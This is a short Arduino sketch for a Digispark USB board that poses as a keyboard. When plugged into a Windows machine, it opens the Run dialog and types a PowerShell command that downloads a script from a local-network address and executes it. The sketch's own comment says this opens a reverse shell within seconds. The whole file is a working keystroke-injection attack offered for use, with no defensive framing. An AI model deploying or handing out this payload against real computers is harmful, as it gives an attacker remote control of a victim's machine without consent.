// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
// Credits to hak5 and samratashok (developer of the nishang framework).

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.23/payload.ps1');\"");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
